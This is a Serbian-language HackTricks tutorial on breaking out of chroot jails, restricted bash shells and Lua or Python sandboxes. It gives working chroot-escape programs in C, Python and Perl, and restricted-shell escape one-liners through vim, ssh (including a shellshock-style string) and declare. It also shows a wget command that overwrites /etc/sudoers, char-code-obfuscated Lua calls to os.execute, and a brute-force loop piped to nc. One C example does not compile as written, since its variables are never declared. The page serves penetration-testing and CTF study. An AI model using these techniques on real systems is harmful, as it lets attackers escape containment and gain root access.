# Izlazak iz zatvora

{% hint style="success" %}
Učite i vežbajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Učite i vežbajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podržite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}

## **GTFOBins**

**Pretražite na** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **da vidite da li možete izvršiti bilo koji binarni fajl sa "Shell" svojstvom**

## Chroot Izlazi

Sa [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): Chroot mehanizam **nije namenjen za odbranu** od namernog mešanja od strane **privilegovanih** (**root**) **korisnika**. Na većini sistema, chroot konteksti se ne slažu pravilno i chrootovani programi **sa dovoljnim privilegijama mogu izvršiti drugi chroot da bi pobegli**.\
Obično to znači da da biste pobegli, morate biti root unutar chroot-a.

{% hint style="success" %}
**Alat** [**chw00t**](https://github.com/earthquake/chw00t) je kreiran da zloupotrebi sledeće scenarije i pobegne iz `chroot`.
{% endhint %}

### Root + CWD

{% hint style="warning" %}
Ako ste **root** unutar chroot-a, **možete pobegnuti** kreiranjem **drugog chroot-a**. To je zato što 2 chroot-a ne mogu koegzistirati (u Linux-u), tako da ako kreirate folder i zatim **napravite novi chroot** u tom novom folderu dok ste **van njega**, sada ćete biti **van novog chroot-a** i stoga ćete biti u FS-u.

To se dešava jer obično chroot NE pomera vaš radni direktorijum na označeni, tako da možete kreirati chroot, ali biti van njega.
{% endhint %}

Obično nećete pronaći `chroot` binarni fajl unutar chroot zatvora, ali **možete kompajlirati, otpremiti i izvršiti** binarni fajl:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Saved fd

{% hint style="warning" %}
Ovo je slično prethodnom slučaju, ali u ovom slučaju **napadač čuva deskriptor datoteke za trenutni direktorijum** i zatim **stvara chroot u novom folderu**. Na kraju, pošto ima **pristup** tom **FD** **van** chroot-a, pristupa mu i **beži**.
{% endhint %}

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

{% hint style="warning" %}
FD može biti prosleđen preko Unix domen soketa, tako da:

* Kreirajte podproces (fork)
* Kreirajte UDS kako bi roditelj i dete mogli da komuniciraju
* Pokrenite chroot u podprocesu u drugom folderu
* U roditeljskom procesu, kreirajte FD foldera koji je van novog chroot-a podprocesa
* Prosledite tom podprocesu taj FD koristeći UDS
* Podproces menja direktorijum na taj FD, i pošto je van svog chroot-a, pobegnuće iz zatvora
{% endhint %}

### Root + Mount

{% hint style="warning" %}
* Montiranje root uređaja (/) u direktorijum unutar chroot-a
* Chrootovanje u taj direktorijum

Ovo je moguće u Linux-u
{% endhint %}

### Root + /proc

{% hint style="warning" %}
* Montirajte procfs u direktorijum unutar chroot-a (ako već nije)
* Potražite pid koji ima drugačiji root/cwd unos, kao: /proc/1/root
* Chroot u taj unos
{% endhint %}

### Root(?) + Fork

{% hint style="warning" %}
* Kreirajte Fork (podproces) i chroot u drugi folder dublje u FS i CD na njega
* Iz roditeljskog procesa, premestite folder u kojem se podproces nalazi u folder prethodni chroot-u dece
* Ovaj podproces će se naći van chroot-a
{% endhint %}

### ptrace

{% hint style="warning" %}
* Pre nekog vremena korisnici su mogli da debaguju svoje procese iz procesa samog sebe... ali ovo više nije moguće po default-u
* U svakom slučaju, ako je moguće, mogli biste ptrace u proces i izvršiti shellcode unutar njega ([vidi ovaj primer](linux-capabilities.md#cap\_sys\_ptrace)).
{% endhint %}

## Bash Jails

### Enumeration

Dobijte informacije o zatvoru:
```bash
echo $SHELL
echo $PATH
env
export
pwd
```
### Измените PATH

Проверите да ли можете да измените PATH env променљиву
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### Koristeći vim
```bash
:set shell=/bin/sh
:shell
```
### Kreirajte skriptu

Proverite da li možete da kreirate izvršni fajl sa _/bin/bash_ kao sadržajem
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### Dobijanje bash-a preko SSH

Ako pristupate putem ssh, možete koristiti ovu trik da izvršite bash shell:
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
### Deklaracija
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

Možete prepisati, na primer, sudoers datoteku
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Ostali trikovi

[**https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)\
[https://pen-testing.sans.org/blog/2012/0**b**6/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells\*\*]\(https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
[https://gtfobins.github.io](https://gtfobins.github.io/\*\*]\(https/gtfobins.github.io)\
**Takođe bi mogla biti zanimljiva stranica:**

{% content-ref url="../bypass-bash-restrictions/" %}
[bypass-bash-restrictions](../bypass-bash-restrictions/)
{% endcontent-ref %}

## Python zatvori

Trikovi o izlasku iz python zatvora na sledećoj stranici:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

## Lua zatvori

Na ovoj stranici možete pronaći globalne funkcije kojima imate pristup unutar lua: [https://www.gammon.com.au/scripts/doc.php?general=lua\_base](https://www.gammon.com.au/scripts/doc.php?general=lua\_base)

**Eval sa izvršavanjem komandi:**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
Neki trikovi za **pozivanje funkcija biblioteke bez korišćenja tačaka**:
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
Nabrojite funkcije biblioteke:
```bash
for k,v in pairs(string) do print(k,v) end
```
Napomena da se svaki put kada izvršite prethodni jedan red u **drugom lua okruženju redosled funkcija menja**. Stoga, ako treba da izvršite jednu specifičnu funkciju, možete izvršiti napad silom učitavajući različita lua okruženja i pozivajući prvu funkciju iz le biblioteke:
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Dobijte interaktivnu lua ljusku**: Ako ste unutar ograničene lua ljuske, možete dobiti novu lua ljusku (i nadamo se neograničenu) pozivajući:
```bash
debug.debug()
```
## Reference

* [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Slajdovi: [https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf))

{% hint style="success" %}
Učite i vežbajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Učite i vežbajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podržite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
